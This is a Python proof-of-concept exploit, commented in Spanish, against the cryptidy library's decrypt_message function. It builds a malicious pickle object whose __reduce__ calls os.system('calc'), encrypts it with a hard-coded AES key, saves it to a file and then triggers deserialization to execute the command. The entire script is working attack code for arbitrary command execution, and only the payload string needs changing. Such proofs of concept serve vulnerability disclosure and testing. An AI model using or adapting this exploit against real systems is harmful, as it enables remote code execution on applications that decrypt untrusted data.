# exploit_cryptidy.py
import os
import pickle
from cryptidy.symmetric_encryption import encrypt_message, decrypt_message

# === Clave AES válida de 32 bytes (AES-256)
AES_KEY = b"1234567890abcdef1234567890abcdef"

# === Clase maliciosa que lanza la calculadora
class Evil:
    def __reduce__(self):
        return (os.system, ("calc",))  # Usa "gnome-calculator" en Linux

# === Generar payload cifrado con objeto malicioso
print(" Generando objeto malicioso...")
malicioso = Evil()

print(" Cifrando payload con AES...")
payload_cifrado = encrypt_message(malicioso, AES_KEY)

# === Guardar como archivo (opcional)
with open("payload_malicioso_cifrado.b64", "wb") as f:
    f.write(payload_cifrado)

print(" Payload cifrado guardado en 'payload_malicioso_cifrado.b64'")

# === Ejecutar exploit (descifrado y ejecución de pickle.loads)
print(" Ejecutando decrypt_message()...")

try:
    ts, resultado = decrypt_message(payload_cifrado, AES_KEY)
    print("OK Exploit ejecutado correctamente")
except Exception as e:
    print(f"X Error en decrypt_message: {e}")
